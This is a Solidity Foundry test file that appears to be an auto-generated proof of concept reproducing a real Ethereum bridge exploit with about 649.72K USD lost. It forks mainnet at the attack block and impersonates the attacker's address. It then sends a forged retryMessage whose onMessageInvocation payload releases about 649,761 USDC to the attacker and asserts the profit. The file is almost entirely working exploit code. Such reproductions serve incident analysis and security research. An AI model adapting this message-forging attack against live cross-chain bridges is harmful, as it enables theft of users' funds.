// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : 649.72K USD
// Attacker : 0x7506dea0c38ca0b55364b22424374c5a1ae1b76a
// Attack Contract : 0xd60247c6848b7ca29eddf63aa924e53db6ddd8ec
// Vulnerable Contract : 0xd60247c6848b7ca29eddf63aa924e53db6ddd8ec
// Attack Tx : 0x017292a7de5fef52a3274e37dda5ace4c4d0cdafe91b7b4ac9c700f02fae35ee
// Block : 25368853
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 649.72K USD
//
// @POC Author
// Generated PoC

// Unresolved renderer gap: action_graph_validation marks the matched retryMessage,
// consumeQuota, onMessageInvocation, and context actions as product-readiness warnings.
// The PoC preserves execution through the observed attack contract entry and does not
// synthesize separate harness calls for protocol-internal frames.
contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attackerEOA;
    address constant ATTACK_CONTRACT = Addresses.attackContract;
    uint256 constant FORK_BLOCK = 25368852;
    uint256 constant TX_TIMESTAMP = 1782079643;
    uint256 constant TX_BLOCK_NUMBER = 25368853;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfit(ATTACK_CONTRACT, address(0));
        _logBalances("Before exploit");
        attack();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function attack() internal {
        bytes memory retryMessageCall = abi.encodeWithSelector(
            IMainnetBridge.retryMessage.selector,
            BridgeMessage({
                messageKind: 2,
                retryNonce: 0,
                gasLimit: 500000,
                destinationBridge: Addresses.destinationBridge,
                destinationChainId: 167000,
                sender: Addresses.attackerEOA,
                messageId: 1,
                owner: Addresses.attackerEOA,
                recipient: Addresses.messageProxy,
                value: 0,
                messageData: abi.encodeWithSelector(
                    IMessageInvocationProxy.onMessageInvocation.selector, _tokenMessage()
                )
            }),
            false
        );
        (bool ok, bytes memory result) = Addresses.attackContract.call{value: TX_VALUE}(retryMessageCall);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
    }

    function _tokenMessage() internal pure returns (bytes memory) {
        return abi.encodePacked(
            bytes32(uint256(0x80)),
            _addrWord(Addresses.destinationBridge),
            _addrWord(Addresses.attackerEOA),
            bytes32(uint256(649761236201)),
            bytes32(uint256(1)),
            _addrWord(Addresses.USDC),
            bytes32(uint256(6)),
            bytes32(uint256(0xa0)),
            bytes32(uint256(0xe0)),
            bytes32(uint256(4)),
            bytes32("USDC"),
            bytes32(uint256(8)),
            bytes32("USD Coin")
        );
    }

    function _addrWord(address account) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(account)));
    }

    function _expectProfitLegs(address attackContract_, address attackChild) internal override {
        attackContract_;
        attackChild;
        _expectProfit(Addresses.attackerEOA, address(0), Addresses.USDC, "USDC", 649761236201);
    }
}

library Addresses {
    address internal constant destinationBridge = 0x1670000000000000000000000000000000000002;
    address internal constant attackerEOA = 0x7506DeA0c38ca0B55364B22424374c5A1ae1B76a;
    address internal constant quotaProxy = 0x91f67118DD47d502B1f0C354D0611997B022f29E;
    address internal constant messageProxy = 0x996282cA11E5DEb6B5D122CC3B9A1FcAAD4415Ab;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant attackContract = 0xd60247c6848B7Ca29eDdF63AA924E53dB6Ddd8EC;
}

struct BridgeMessage {
    uint64 messageKind;
    uint64 retryNonce;
    uint32 gasLimit;
    address destinationBridge;
    uint64 destinationChainId;
    address sender;
    uint64 messageId;
    address owner;
    address recipient;
    uint256 value;
    bytes messageData;
}

interface IMainnetBridge {
    function retryMessage(BridgeMessage calldata message, bool isLastAttempt) external;
    function context() external view returns (bytes32 messageHash, address destinationBridge, uint64 destinationChainId);
}

interface IQuotaProxy {
    function consumeQuota(address, uint256) external;
}

interface IMessageInvocationProxy {
    function onMessageInvocation(bytes calldata) external;
}
